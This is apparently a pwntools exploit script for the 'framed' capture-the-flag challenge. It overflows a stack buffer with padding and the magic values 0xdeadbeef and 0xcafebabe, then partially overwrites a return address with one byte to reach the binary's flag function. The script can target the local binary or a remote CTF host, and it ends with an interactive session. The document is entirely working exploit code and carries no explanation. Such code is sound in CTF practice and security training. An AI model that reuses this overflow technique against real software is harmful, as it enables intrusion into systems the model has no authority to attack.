#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./for_players/framed"
HOST = "framed.zajebistyc.tf"
PORT = 17005 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_flag = elf.symbols["flag"]

def exploit():
	buflen = 0x30+8
	payload = b"a"*0x30
	payload += p32(0xdeadbeef)
	payload += p32(0xcafebabe)
	conn.sendlineafter("name?", payload)
	conn.sendlineafter("fles?", "0")
	
	payload = b"a"*buflen
	payload += b"\x1b"
	conn.sendafter("lucky!", payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
